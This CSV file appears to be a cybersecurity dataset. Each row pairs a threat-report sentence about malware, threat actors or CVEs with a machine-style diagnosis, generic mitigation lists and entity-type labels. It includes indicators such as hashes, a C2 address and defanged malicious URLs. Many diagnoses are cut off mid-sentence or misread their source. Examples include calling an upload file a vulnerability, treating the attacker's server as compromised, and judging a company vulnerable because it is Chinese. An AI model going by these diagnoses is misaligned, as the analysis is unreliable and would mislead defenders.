13588,"the blog post describes a web shell with two components — a php script and an html uploading file — however, the second one is not needed as the proper post request can be created with any custom or third-party tool (e.g., fiddler). figure 6.","the entity identified as ""tools"" is involved in a consists-of relationship with both the php script and html uploading file, leading to a cybersecurity issue with the web shell. specifically, the unnecessary html uploading file creates a vulnerability that can be exploited with custom",1. remove the unnecessary html uploading file to eliminate the vulnerability. 2. implement access controls to restrict access to the web shell. 3. use web application firewalls to detect and block malicious traffic. 4. regularly update and patch the php script to address any known vulnerabilities. 5. conduct regular security audits and penetration testing to identify and address any potential weaknesses.,tools,tools,tools
13561,"as previously mentioned, water pamola sent online shopping orders appended with a malicious xss script to attack e-commerce administrators.",diagnosis: water pamola conducted a campaign using an xss attack pattern to target e-commerce administrators. the identity of the attacker is currently unknown.,1. implementing web application firewalls (wafs) to detect and prevent xss attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security weaknesses. 3. implementing multi-factor authentication (mfa) to prevent unauthorized access to e-commerce platforms. 4. implementing security information and event management (siem) systems to monitor and detect suspicious activities. 5. educating e-commerce administrators on cybersecurity best practices and raising awareness about the risks of xss attacks.,campaign,attack-pattern,identity
3422,backdoor.win64.biopass.a e52ea54cfe3afd93a53e368245c5630425e326291bf1b2599b75dbf8e75b7aeb flashplayer_install_cn.exe biopass rat loader backdoor.win64.biopass.a f1ad25b594a855a3c9af75c5da74b44d900f6fbb655033f9a98a956292011c8e silverlight.exe,the diagnosis is that the entity e52ea54cfe3afd93a53e368245c5630425e326291bf1b2599b75dbf8e75b7aeb is infected with the backdoor.win,1. install and regularly update antivirus software to detect and remove backdoor.win and other malware. 2. implement a firewall to block unauthorized access to the infected entity and prevent the spread of the infection. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential security gaps. 4. implement access controls to limit user access to sensitive data and systems. 5. educate employees on safe browsing habits and the risks associated with opening suspicious emails or attachments. 6. use intrusion detection and prevention systems,malware,hash,hash
336,"all of the domains currently resolve to 151.248.115.146, a russian ip address and have whois records associated with the e-mail address “ladomfichisi1987@mail.ru”.","the diagnosis is that the entity associated with the cybersecurity issue is a group or individual using the email address ""ladomfichisi1987@mail.ru"" and the ip address 151.248.115.146 located in russia. the relationship between","1. implement email filtering and blocking mechanisms to prevent emails from ""ladomfichisi1987@mail.ru"" from entering the organization's network. 2. use firewall rules to block traffic from the ip address 151.248.115.146. 3. deploy intrusion detection systems that can detect and alert the security team of any suspicious activity originating from the ip address or email address. 4. conduct regular vulnerability assessments and penetration testing to identify and remediate any vulnerabilities in the organization's network that",IPV4,location,EMAIL
600,"the attackers behind hancitor aren’t the first to time their spam attacks like this, but it is an effective tactic to try and increase their chances of success, especially when combined with the other innovation that we’ve seen.",the diagnosis is that hancitor is a malware attack that utilizes a specific attack-pattern to increase its chances of success.,1. implementing strong and up-to-date antivirus software that can detect and prevent hancitor malware attacks. 2. using email filters to block suspicious emails that may contain hancitor malware. 3. conducting regular security awareness training for employees to educate them on how to identify and avoid hancitor malware attacks. 4. implementing network segmentation to limit the spread of hancitor malware in case of an attack. 5. enforcing strong password policies and multi-factor authentication to prevent unauthorized access,malware,attack-pattern,
2555,credential theft has been known to be a key part of the shamoon 2 attacks.,the threat actor in the shamoon 2 attacks is using credential theft as a key part of their attack pattern.,1. implementing multi-factor authentication (mfa) to prevent unauthorized access to sensitive systems and data. 2. conducting regular security awareness training for employees to educate them on the importance of strong passwords and the risks of credential theft. 3. deploying endpoint detection and response (edr) solutions to detect and respond to credential theft attempts. 4. implementing privileged access management (pam) solutions to control and monitor access to critical systems and data. 5. conducting regular vulnerability assessments and,attack-pattern,threat-actor,
14299,"in the case of the windows variant (worm_infokey.a) of maikspy last seen in april 2017, the user will be tricked into downloading a miakhalifa.rar file, which contains the files seen in the screenshot below:","the diagnosis is a malware attack, specifically the maikspy windows variant (worm_infokey.a), which is spread through a trick that involves the user downloading a miakhalifa.rar file. the malware is related to two entities labeled as ""","1. implementing robust antivirus software and firewalls to prevent malware attacks such as the maikspy windows variant from entering the system. 2. conducting regular security awareness training for employees to educate them on the risks of downloading and opening suspicious files, and how to identify and report potential threats. 3. implementing email filtering systems to prevent phishing emails and other malicious messages from reaching employees' inboxes. 4. regularly updating software and operating systems to ensure that known vulnerabilities are patched and closed,",TIME,SOFTWARE,malware
2682,"lockbit 2.0 operators also released an information-stealer dubbed stealbit, which was developed to support affiliates of the lockbit 2.0 raas when exfiltrating data from breached companies.",the diagnosis is a cyber attack by threat actors using lockbit 2.0 malware to breach companies and exfiltrate data. the threat actors also developed an information-stealer called stealbit to support their malicious activities. the malware was likely authored,"1. implementing robust endpoint security solutions that can detect and prevent malware infections, including lockbit 2.0 and stealbit. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate security weaknesses that could be exploited by threat actors. 3. implementing network segmentation to prevent lateral movement by threat actors in the event of a successful breach. 4. deploying advanced threat intelligence solutions that can identify and block malicious traffic associated with lockbit 2.0 and steal",malware,threat-actor,threat-actor
14337,"based on these findings, it’s possible that the attackers behind maikspy operate //www[.]roundyearfun[.]org/ and hxxp://miakhalifagame[.]com/.","maikspy has been found to be associated with the malicious urls //www[.]roundyearfun[.]org/ and hxxp://miakhalifagame[.]com/, indicating a potential malware infection and a relationship between the malware",1. implement regular malware scans and removal tools to detect and remove any potential infections associated with maikspy. 2. block access to the malicious urls identified in the diagnosis to prevent further infection. 3. implement network segmentation to isolate infected devices and prevent the spread of malware. 4. educate employees on safe browsing practices and the importance of avoiding suspicious websites and downloads. 5. implement intrusion detection and prevention systems to detect and block any attempts to exploit vulnerabilities associated with maikspy.,malware,URL,URL
3781,mirai/gafgyt dropper scripts or variants perl shellbot coinminer activity webshell downloads (full injected command) callback/scanning activity direct download exploits where payloads were no longer live at the time of analysis: sample hashes 801b23bffa65facee1da69bc6f72f8e1e4e1aeefc63dfd3a99b238d4f9d0a637 6d403c3fc246d6d493a6f4acc18c1c292f710db6ad9c3ea2ff065595c5ad3c5b 940a674cfe8179b2b8964bf408037e0e5a5ab7e47354fe4fa7a9289732e1f1b8 fdc94d0dedf6e53dd435d2b5eacb4c34923fadee50529db6f3de38c71f325e05 85143ecc41fb6aadd822ed2d6f20c721a83ae1088f406f29b8b0b05459053a03 bot.v 0b4b25fab4c922e752e689111f38957e0402fd83f6b1d69e8f43c6f4b68fc1ba c2 server : 5[.]39.217.212:80,"the diagnosis is a malware attack involving the mirai/gafgyt dropper scripts or variants, perl shellbot, and coinminer activity. the attack also involves webshell downloads with full injected command, callback/scanning activity, and direct download exploits","1. install and regularly update anti-malware software to detect and remove mirai/gafgyt dropper scripts and variants, perl shellbot, and coinminer activity. 2. implement network segmentation to isolate infected devices and prevent lateral movement of the malware. 3. conduct regular vulnerability assessments and patch management to address known vulnerabilities that could be exploited by attackers. 4. utilize intrusion detection and prevention systems to detect and block callback/scanning activity and direct download exploits. 5. monitor network traffic",malware,hash,hash
1820,the tools transferred using anydesk are: netscan: to scan for other endpoints nmap (log4shell.nse): to scan for log4shell vulnerable endpoints hacking tools mimikatz and impacket: for lateral movement pdq deploy: for mass deployment of malicious script to multiple endpoints aswarpot.sys: for disabling defense solutions.,"the diagnosis is a potential cyberattack involving the use of various tools transferred using anydesk. the tools include netscan for scanning other endpoints, nmap for scanning for log4shell vulnerable endpoints, mimikatz and impacket for lateral movement, pd","1. implement strong access controls: to prevent unauthorized access to your systems, ensure that only authorized personnel have access to sensitive information and systems. 2. use a secure remote access solution: implement a secure remote access solution that provides secure remote access to your systems and data. this can help to prevent unauthorized access to your systems and data. 3. implement network segmentation: network segmentation can help to prevent the spread of malware across your network. by segmenting your network, you can limit the damage that a",tools,tools,attack-pattern
13541,victims are now mainly located only in japan.,"possible diagnosis: the cybersecurity issue involves a targeted attack on japanese individuals or organizations, possibly with the goal of stealing sensitive information or disrupting operations. the attacker(s) may have gained access to personal or corporate data through various means, such as phishing, malware",1. implementing multi-factor authentication for all users to prevent unauthorized access to sensitive information. 2. conducting regular security awareness training to educate employees on how to identify and avoid phishing attacks. 3. installing and regularly updating anti-malware software to prevent malware infections. 4. conducting regular vulnerability assessments and penetration testing to identify and address potential security weaknesses. 5. implementing network segmentation to limit the spread of any potential breaches. 6. implementing intrusion detection and prevention systems to detect and block,location,identity,
4845,we have also observed indian hack-for-hire firms work with freelance actors not directly employed by the firms themselves.,"possible diagnosis: the cybersecurity issue is related to the use of unaffiliated actors by indian hack-for-hire firms, which may increase the risk of unauthorized access, data theft, or other malicious activities. the entities involved are the indian hack-for-h",1. implement stricter vetting and background checks for employees and contractors of indian hack-for-hire firms. 2. increase cybersecurity awareness and training for employees and contractors of indian hack-for-hire firms. 3. implement multi-factor authentication and access controls to limit unauthorized access to sensitive data. 4. implement robust encryption protocols to protect data from theft or unauthorized access. 5. regularly monitor and audit all systems and networks to detect and prevent malicious activities. 6. collaborate with law enforcement agencies to investigate,location,identity,
2058,"from the github page, we also observed a url to a site – xn--90a5ai[.]com(фсб[.]com) – resolving to the previously mentioned ip 164[.]68[.]114[.]29, which at this point in time only shows an animation of interconnecting points.",possible diagnosis: the cybersecurity issue is related to a suspicious url (xn--90a5ai[.]com(фсб[.]com)) that resolves to an ip address (164[.]68[.]114[.]29) which currently,1. block the suspicious url and ip address at the network level using firewalls and intrusion prevention systems. 2. implement web filtering and content scanning to prevent users from accessing the suspicious url. 3. conduct regular security awareness training for employees to educate them on how to identify and avoid suspicious urls. 4. use anti-phishing software to detect and block phishing attempts that use suspicious urls. 5. implement multi-factor authentication to prevent unauthorized access to sensitive data in case of a successful phishing attack.,url,IPV4,SOFTWARE
3365,.python.biopass.a f21decb19da8d8c07066a78839ffd8af6721b1f4323f10a1df030325a1a5e159 cdaemon.txt biopass rat python script (cdaemon module),"the diagnosis is that the entity ""python.biopass.a"" is a malware identified by the hash value ""f21decb19da8d8c07066a78839ffd8af6721b1f4323f10","1. install and regularly update antivirus software to detect and remove the malware. 2. implement network segmentation to isolate infected systems and prevent the spread of the malware. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the system. 4. implement strong password policies and multi-factor authentication to prevent unauthorized access to the system. 5. educate employees on cybersecurity best practices, such as avoiding suspicious emails and not downloading or installing unknown software.",malware,hash,FILEPATH
5070,"on february 10, threat analysis group discovered two distinct north korean government-backed attacker groups exploiting a remote code execution vulnerability in chrome, cve-2022-0609.","diagnosis: north korean government-backed attacker groups are exploiting a remote code execution vulnerability in chrome, cve-2022-0609. the vulnerability is being duplicated and exploited by the attackers, who have a relationship with the vulnerability through exploitation. the vulnerability","1. patch management: ensure that all software and applications are up-to-date with the latest security patches and updates, including chrome and other web browsers. 2. network segmentation: isolate critical systems and sensitive data from the rest of the network to minimize the attack surface and prevent lateral movement by attackers. 3. endpoint protection: deploy endpoint protection solutions such as antivirus, anti-malware, and intrusion detection/prevention systems to detect and block malicious activities. 4. user education and awareness: educate",TIME,identity,threat-actor
3409,biopass rat loader backdoor.win64.biopass.a 9eed9a2e0edf38f6354f4e57b3a6b9bed5b19263f54bcee19e66fc8af0c29e4e test.exe biopass rat loader backdoor.win64.biopass.a 9f34d28562e7e1e3721bbf679c58aa8f5898995ed999a641f26de120f3a42cf4 silverlight1.exe biopass rat loader backdoor.win64.biopass.a 9ff906ffcde32e4c6fb3ea4652e6d6326713a7fde8bb783b52f12a1f382f8798 test.exe biopass rat loader backdoor.win64.biopass.a a7c4dac7176e291bd2aba860e1aa301fb5f7d880794f493f2dea0982e2b7eb31 test.exe biopass rat loader backdoor.win64.biopass.a b48e01ff816f12125f9f4cfc9180d534c7c57ef4ee50c0ebbe445e88d4ade939 test.exe biopass rat loader backdoor.win64.biopass.a b82bde3fe5ee900a76ac27b4869ed9aa0802c63bbd72b3bfb0f1abce6340cc6c silverlight_ins.exe biopass rat loader backdoor.win64.biopass.a b9d0838be8952ebd4218c8f548ce94901f789ec1e32f5eaf46733f0c94c77999 silverlight_ins.exe,"the diagnosis is that the malware backdoor.win64.biopass.a has been loaded onto multiple files (test.exe, silverlight1.exe, and silverlight_ins.exe) using the biopass rat loader. the hash values of the infected","1. install and regularly update antivirus software to detect and remove malware, including backdoor.win64.biopass.a. 2. implement network segmentation to isolate infected files and prevent the spread of malware to other systems. 3. conduct regular vulnerability assessments and patch management to identify and address vulnerabilities that may be exploited by attackers. 4. use intrusion detection and prevention systems (idps) to monitor network activity and detect and prevent unauthorized access or malware infections. 5. implement access controls and user authentication measures",malware,hash,malware
3393,biopass rat loader backdoor.win64.biopass.a 3e8f8b8a5f70c195a2e4d4fc7f80523809f6dbf9ead061ce8ef04fb489a577cf test-flash.exe biopass rat loader backdoor.win32.biopass.a 5d7aa3474e734913ecb4b820c0c546c92f7684081c519eecd3990e11a19bf2ba flash_installer.exe,"the diagnosis is that the entities ""test-flash.exe"" and ""flash_installer.exe"" are infected with the biopass rat loader backdoor malware, specifically backdoor.win64.biopass.a and backdoor.win32.biopass",1. implementing an antivirus program that is capable of detecting and removing the biopass rat loader backdoor malware from the system. 2. conducting a thorough system scan to identify any other potential malware infections that may have been missed. 3. isolating the infected entities and preventing them from communicating with the network to prevent further spread of the malware. 4. updating all software and operating systems to their latest versions to patch any vulnerabilities that may have been exploited by the malware. 5. implement,malware,malware,hash
1882,avoslocker executable 05ba2df0033e3cd5b987d66b6de545df439d338a20165c0ba96cde8a74e463e5 ransom.win32.avoslocker.smyxblnt mimikatz executable (x32 and x64) 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 hacktool.win64.mimikatz.ztja e81a8f8ad804c4d83869d7806a303ff04f31cce376c5df8aada2e9db2c1eeb98 hacktool.win32.mimikatz.cnfw log4shell nmap nse script ddcb0e99f27e79d3536a15e0d51f7f33c38b2ae48677570f36f5e92863db5a96 backdoor.win32.cve202144228.yacah impacket tool 14f0c4ce32821a7d25ea5e016ea26067d6615e3336c3baa854ea37a290a462a8 hacktool.win32.impacket.aa,"the entities involved in this cybersecurity issue are avoslocker executable, mimikatz executable, log4shell, nmap nse script, impacket tool, and the relationship between them involves the use of various tools and hashes. the diagnosis is that","1. implementing a comprehensive endpoint protection solution that can detect and prevent the execution of malicious executables like avoslocker and mimikatz. 2. deploying a network intrusion detection system (nids) that can detect and alert on suspicious network traffic generated by tools like nmap and impacket. 3. regularly scanning and patching systems for vulnerabilities, including those exploited by log4shell, to prevent exploitation by attackers. 4. implementing a strong password policy and multi-factor authentication to",tools,tools,hash
1262,"all five phishing campaigns targeted a japanese manufacturing firm over the course of two months, but the final campaign also targeted a separate japanese high-tech organization.","the diagnosis is a targeted phishing attack on a japanese manufacturing firm and a separate japanese high-tech organization. the entities involved are the manufacturing firm and the high-tech organization, both of which were targeted by five phishing campaigns over a two-month period. the relationship","1. implement regular cybersecurity training and awareness programs for all employees of the manufacturing firm and high-tech organization to educate them on how to identify and report phishing attacks and other cyber threats. 2. use advanced email security solutions that can detect and block phishing emails before they reach the employees' inboxes. this can include solutions that use artificial intelligence and machine learning to analyze email content, sender reputation, and other factors to determine the likelihood of a phishing attack. 3. implement two-factor authentication (2fa)",attack-pattern,identity,identity
2558,"in our research, we’re able to outline that shamoon 2 enters and spreads through an organization in three stages: these stages are outlined in the image below. and that credential theft is a key element in each stage: it’s also worth noting that credentials are a keystone issue in shamoon 2 wave 2 too: we saw evidence of targeting an organization’s virtual desktop infrastructure (vdi) solutions with default credentials.",diagnosis: shamoon 2 campaign utilizes an attack pattern that involves credential theft as a key element in each stage. the threat actor targets an organization's virtual desktop infrastructure (vdi) solutions with default credentials.,1. implement multi-factor authentication (mfa) to prevent unauthorized access to virtual desktop infrastructure (vdi) solutions. 2. regularly change default credentials and enforce strong password policies. 3. conduct regular security assessments to identify and mitigate vulnerabilities in vdi solutions. 4. deploy endpoint protection solutions such as anti-virus and anti-malware software to detect and prevent credential theft. 5. establish network segmentation to limit the spread of the attack and isolate infected systems. 6. implement security information and,threat-actor,campaign,attack-pattern
2391,"but because earth baku has updated its toolset with stealthvector, stealthmutant, and scramblecross for this new campaign, we have identified it as its own separate operation.","diagnosis: earth baku is a threat actor that has launched a new campaign using stealthvector, stealthmutant, and scramblecross malware. the relationship between earth baku and the malware is that earth baku uses the malware as tools","1. implementing advanced threat detection and prevention systems that can identify and block the use of stealthvector, stealthmutant, and scramblecross malware. 2. conducting regular security audits and vulnerability assessments to identify and mitigate potential attack vectors that may be exploited by earth baku and other threat actors. 3. deploying endpoint protection solutions that can detect and block the installation and execution of malicious software on endpoints. 4. implementing network segmentation and access controls to limit the lateral movement of malware",threat-actor,malware,malware
3912,"one notable vulnerability in the microsoft exchange server is cve-2020-0688, a remote code execution bug.","the entity software has a vulnerability labeled cve-2020-0688. this vulnerability is being used by an attack-pattern to execute remote code on the microsoft exchange server. therefore, the diagnosis is a remote code execution attack on the microsoft exchange server due",1. apply the latest security updates and patches to the affected microsoft exchange server to address the cve-2020-0688 vulnerability. 2. implement network segmentation to limit access to the microsoft exchange server and prevent lateral movement by attackers. 3. deploy intrusion detection and prevention systems (idps) to monitor network traffic and detect any suspicious activity or attempts to exploit vulnerabilities. 4. use multi-factor authentication (mfa) to secure user accounts and prevent unauthorized access to the microsoft exchange server. 5.,SOFTWARE,vulnerability,attack-pattern
1320,formerfirstrat communicates using unencrypted http over port 443; the use of mismatching ports and communication protocols is not uncommon in targeted attack campaigns.,"the campaign entity uses the malware entity, formerfirstrat, to communicate using unencrypted http over port 443. this indicates a vulnerability to targeted attacks and highlights the need for improved cybersecurity measures to prevent data breaches and other malicious activities. a diagnosis","potential cybersecurity solutions to address the vulnerability identified in the diagnosis include: 1. implementing secure communication protocols: the use of unencrypted http over port 443 makes it easy for attackers to intercept and manipulate data. the campaign entity should consider implementing secure communication protocols such as https to encrypt all communication between their systems and prevent unauthorized access. 2. regular vulnerability assessments: regular vulnerability assessments can help identify weaknesses in the system that attackers can exploit. by identifying vulnerabilities early, the campaign entity can take proactive measures to",malware,campaign,
4244,"we found more code shared among the two threat actor’s malware, as patchwork recently used multiple delphi malware similar to some of the delphi malware we described before.",the diagnosis is that there is a cybersecurity issue involving the threat actor and their use of malware. the relationship between the threat actor and the malware is that the threat actor uses the malware and has duplicated some of it.,"1. implementing advanced threat detection and prevention systems that can identify and block malware before it can cause harm. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate potential security weaknesses. 3. implementing strict access controls and user authentication protocols to prevent unauthorized access to sensitive data and systems. 4. implementing network segmentation and isolation to limit the spread of malware in case of a breach. 5. educating employees on cybersecurity best practices and the risks of malware, including phishing attacks",malware,malware,threat-actor
3337,we have found several connections between biopass rat and the winnti group:,the diagnosis is that the winnti group is using the biopass rat malware as part of their cyber espionage operations.,1. implement advanced threat detection and response solutions that can identify and block the biopass rat malware in real-time. 2. conduct regular security audits and penetration testing to identify and patch vulnerabilities in the network and systems. 3. implement a zero-trust security model that limits access to sensitive data and systems based on user context and behavior. 4. develop and enforce strict security policies and procedures for employees and third-party vendors to prevent unauthorized access and data exfiltration. 5. deploy endpoint protection solutions,malware,threat-actor,
14263,"our analysis of the latest maikspy variants revealed that users contracted the spyware from hxxp://miakhalifagame[.]com/, a website that distributes malicious apps (including the 2016 adult game) and connects to its c&c server to upload data from infected devices and machines.","the diagnosis is that the users contracted malware from the website hxxp://miakhalifagame[.]com/, which is an infrastructure that distributes malicious apps, including the 2016 adult game. the website connects to its c&c server",1. implement a robust web filtering solution that blocks access to known malicious websites like hxxp://miakhalifagame[.]com/. 2. deploy an advanced anti-malware solution that can detect and remove malware from endpoints and servers. 3. use intrusion detection and prevention systems (idps) that can identify and block any communication with c&c servers. 4. conduct regular security awareness training for users to educate them on the dangers of visiting untrusted websites and downloading unverified apps,malware,URL,Infrastucture
4847,"a recent campaign from an indian hack-for-hire operator was observed targeting an it company in cyprus, an education institution in nigeria, a fintech company in the balkans and a shopping company in israel.","the diagnosis is a coordinated cyber espionage campaign conducted by an indian hack-for-hire operator targeting multiple entities across different locations. the targets include an it company in cyprus, an education institution in nigeria, a fintech company in the balkans, and a",1. implementing strong access controls and two-factor authentication to prevent unauthorized access to sensitive data and networks. 2. conducting regular security assessments and penetration testing to identify vulnerabilities and address them promptly. 3. deploying advanced threat detection and response tools to monitor network activity and detect any suspicious behavior. 4. educating employees on cybersecurity best practices and implementing strict security policies and procedures. 5. collaborating with law enforcement and intelligence agencies to investigate and prosecute cyber criminals. 6. establishing partnerships with cybersecurity,location,location,location
4826,"coldriver, a russian-based threat actor sometimes referred to as callisto, continues to send credential phishing emails to targets including government and defense officials, politicians, ngos and think tanks, and journalists.","the diagnosis is a targeted phishing attack conducted by the threat actor coldriver (also known as callisto), who is based in russia. the targets of the attack include government and defense officials, politicians, ngos and think tanks, and journalists. the","1. implement strong email security protocols such as two-factor authentication, email encryption, and spam filters to prevent phishing attacks. 2. provide regular cybersecurity training to employees to educate them about the latest phishing tactics and how to identify suspicious emails. 3. use advanced threat intelligence solutions to detect and respond to phishing attacks in real-time. 4. conduct regular vulnerability assessments and penetration testing to identify and address vulnerabilities in the organization's systems and networks. 5. implement access controls and limit privileges to sensitive data to prevent",location,threat-actor,threat-actor
947,taomike is a chinese company that aims to become the biggest mobile advertisement solution platform in china.,"possible diagnosis: taomike may be vulnerable to cyber attacks targeting its mobile advertisement platform due to its location in china, which has been known for state-sponsored hacking and cyber espionage activities. the identity of taomike as a chinese company may also raise",1. implement strong authentication and access controls to restrict access to the mobile advertisement platform to authorized users only. 2. regularly update software and security patches to prevent known vulnerabilities from being exploited. 3. use encryption to protect sensitive data transmitted over the mobile advertisement platform. 4. conduct regular security audits and penetration testing to identify and address potential vulnerabilities. 5. use a reputable cloud-based security solution to monitor and detect any suspicious activity on the platform. 6. train employees on cybersecurity best practices and raise awareness,identity,location,location
13922,"as previously mentioned, darkside avoids victimizing companies in cis countries.",no diagnosis can be generated from this input as it only provides information about darkside's avoidance of victimizing companies in cis countries and does not indicate any cybersecurity issue or problem.,"as there is no cybersecurity issue or problem identified in the input, no specific cybersecurity solution can be provided. however, it is always recommended to implement basic cybersecurity measures such as keeping software and operating systems up to date, using strong passwords, and regularly backing up important data to prevent potential cyber attacks. it is also important to stay informed about the latest cybersecurity threats and trends to proactively protect against them.",malware,location,
2496,"palo alto networks cortex xdr prevent and pro customers running agent version 7.4 and above with content version 450-87751 on linux devices are protected from cve-2022-22963 using the java deserialization module; customers running agent version 7.7 and content 480 and above are protected from cve-2022-22963 and cve-2022-22965 for both windows and linux using the java deserialization module; other oses and exploits receive protections from post-exploitation activities using behavioral threat protection, password theft prevention, anti ransomware and other anti exploitation modules.",the diagnosis is that palo alto networks cortex xdr prevent and pro customers running agent version 7.4 and above with content version 450-87751 on linux devices are protected from cve-2022-22963 using the java deserialization module,1. upgrade to the latest version of palo alto networks cortex xdr agent and content to ensure protection against cve-2022-22963 on linux devices. 2. implement additional security measures such as firewall rules and intrusion detection systems to detect and prevent any potential attacks exploiting cve-2022-22963. 3. conduct regular vulnerability assessments and penetration testing to identify any potential security vulnerabilities in the system. 4. educate employees on the importance of cybersecurity and how to identify and report any suspicious activity,vulnerability,SOFTWARE,SOFTWARE
4817,follina is a remote code execution (rce) vulnerability in the microsoft windows support diagnostic tool (msdt).,"the entity software has a vulnerability known as follina, which is a remote code execution (rce) vulnerability in the microsoft windows support diagnostic tool (msdt).",1. patch management: ensure that the latest security patches and updates are applied to the affected software to mitigate the risk of exploitation. 2. network segmentation: implement network segmentation to limit the spread of the vulnerability to other systems in the network. 3. access control: restrict access to the affected system and software to authorized personnel only. 4. antivirus/antimalware: deploy antivirus and antimalware solutions to detect and prevent the installation and execution of malicious code on the system. 5,SOFTWARE,vulnerability,vulnerability
3766,"attackers can, therefore, leverage cve-2022-22954 to remotely execute commands to overwrite specific paths.","the diagnosis is a vulnerability exploit using cve-2022-22954 that allows attackers to remotely execute commands and overwrite specific paths. the entities involved are the vulnerability (cve-2022-22954), the attack pattern (remote command execution), and",1. patching and updating systems to address the vulnerability identified by cve-2022-22954. 2. implementing network segmentation to limit the impact of a successful attack. 3. implementing access controls to restrict access to sensitive systems and data. 4. implementing intrusion detection and prevention systems to identify and block malicious activity. 5. enforcing strong password policies and multi-factor authentication to prevent unauthorized access to systems. 6. conducting regular security audits and vulnerability assessments to identify and address potential,attack-pattern,vulnerability,attack-pattern
4850,"one cluster of this activity frequently targets government, healthcare, and telecom sectors in saudi arabia, the united arab emirates, and bahrain with credential phishing campaigns.","the diagnosis is a targeted credential phishing campaign against government, healthcare, and telecom sectors in saudi arabia, the united arab emirates, and bahrain. the campaign is being carried out by a specific group or entity that is actively targeting these sectors. the relationship between",1. implementing multi-factor authentication (mfa) for all employees in the targeted sectors to prevent unauthorized access to sensitive information. 2. conducting regular cybersecurity awareness training for employees to educate them on phishing techniques and how to identify and report suspicious emails. 3. deploying advanced email security solutions such as email filters and anti-phishing software to detect and block phishing attacks. 4. conducting regular vulnerability assessments and penetration testing to identify and address security weaknesses in the targeted sectors' it infrastructure. 5,location,location,location
2298,"in late august 2021, tag discovered watering hole attacks targeting visitors to hong kong websites for a media outlet and a prominent pro-democracy labor and political group.",diagnosis: watering hole attacks targeting visitors to hong kong websites for a media outlet and a prominent pro-democracy labor and political group. entities: - time (late august 2021) - attack-pattern (watering hole attacks),1. implementing web application firewalls (wafs) to detect and block malicious traffic targeting the media outlet and pro-democracy labor and political group websites. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate vulnerabilities in the websites. 3. implementing multi-factor authentication (mfa) to prevent unauthorized access to the websites. 4. educating employees and visitors on the risks of watering hole attacks and how to identify and report suspicious activity. 5. implementing network,TIME,attack-pattern,identity
13551,the script connects to the water pamola’s server and downloads additional payloads.,"possible diagnosis: water pamola's server has been compromised by malware, which is being used to download additional payloads from an infrastructure controlled by the attacker. the script is likely part of a larger attack campaign aimed at stealing sensitive data, disrupting operations, or",1. implement regular security audits and vulnerability assessments to detect and mitigate any security weaknesses in the server system. 2. install and regularly update anti-virus and anti-malware software to detect and remove any malicious software that may have infected the server. 3. implement access controls and user authentication protocols to prevent unauthorized access to the server. 4. regularly backup critical data to ensure that it can be restored in the event of a successful cyber attack. 5. implement security monitoring and incident response procedures to,malware,Infrastucture,
2354,beer was able to quickly recognize this exploit as a variant of an earlier port type confusion vulnerability he analyzed in the xnu kernel (cve-2020-27932).,"the diagnosis is a vulnerability in the software entity (xnu kernel) identified by beer, who recognized it as a variant of an earlier exploit through the relationship of ""has"" between the vulnerability and the software entity.",1. patch the vulnerability in the xnu kernel identified by beer to prevent exploitation. 2. implement regular software updates to address known vulnerabilities. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the system. 4. implement access controls and authentication measures to prevent unauthorized access to the system. 5. implement network segmentation to limit the impact of a potential breach. 6. implement intrusion detection and prevention systems to detect and prevent malicious activity. 7. train employees on cybersecurity best practices,SOFTWARE,vulnerability,
2061,", we were able to observe another github account with the name l4ckyguy, sharing the profile picture, location and url in the description, with a link to the previously observed account (x4kme), and a name, ivan topor, which we believe may be another alias for this threat actor.","threat actor using multiple identities (including l4ckyguy and ivan topor) to conduct cyber attacks, with a link between the two identities observed on github. the threat actor is potentially located in multiple locations.",1. implementing multi-factor authentication (mfa) to prevent unauthorized access to systems and accounts. 2. conducting regular security audits to identify and address vulnerabilities in the system. 3. implementing security information and event management (siem) systems to monitor network traffic and identify suspicious activity. 4. implementing a centralized identity and access management (iam) system to manage and control user access across multiple locations. 5. implementing threat intelligence solutions to monitor and identify potential threats and attacks. 6,SOFTWARE,identity,threat-actor
4383,"like much of their tooling, hyperscrape is not notable for its technical sophistication, but rather its effectiveness in accomplishing charming kitten’s objectives.","charming kitten, a threat actor, is using hyperscrape malware to accomplish their objectives. a diagnosis of a cybersecurity breach and potential data theft or system compromise is likely. it is recommended to conduct a full investigation and implement necessary security",1. conduct a thorough investigation of the system and network to identify any potential vulnerabilities or compromised systems. 2. implement advanced threat detection and response tools to detect and respond to any potential cyber threats. 3. deploy endpoint protection solutions to prevent malware attacks and limit the potential impact of any successful attacks. 4. implement strong access controls and user authentication mechanisms to prevent unauthorized access to sensitive data and systems. 5. regularly update and patch all software and firmware to ensure that any known vulnerabilities are addressed and prevent,malware,threat-actor,
1716,"i2p users can access specific i2p services that are only accessible on i2p, or access internet resources without exposing their ip address. in the case of cryptowall 3.0, the malware is attempting to access multiple .i2p resources only accessible through i2p, also known as “eepsites.” the cryptowall 3.0 uses i2p in the same way cryptowall 2.0 used tor, to give victims access to a decrypting service to get their files back.","the diagnosis is a malware attack using i2p and accessing specific i2p services to carry out its malicious activities. the malware, cryptowall 3.0, is using i2p in the same way it used tor in the past,",1. implement network traffic monitoring and analysis tools to detect and block suspicious i2p traffic. 2. deploy anti-malware software that can detect and remove cryptowall 3.0. 3. educate employees on safe browsing habits and the dangers of downloading and opening suspicious files or emails. 4. implement access controls and restrict access to i2p services to authorized personnel only. 5. regularly update software and security patches to prevent vulnerabilities that can be exploited by malware. 6. implement,SOFTWARE,SOFTWARE,malware
3362,c1222.txt biopass rat python script (c1222 module) trojan,"the diagnosis is that the biopass rat python script (c1222 module) is infected with a trojan malware, as indicated by the relationship between the filepath entity and the malware entity in the provided input.",1. use antivirus software to detect and remove the trojan malware from the biopass rat python script. 2. implement network segmentation to isolate the infected device and prevent the spread of the trojan malware to other devices on the network. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential security weaknesses in the system. 4. implement access controls and user permissions to limit the ability of unauthorized users to access and modify critical system files. 5. educate employees on safe browsing habits and how,malware,FILEPATH,
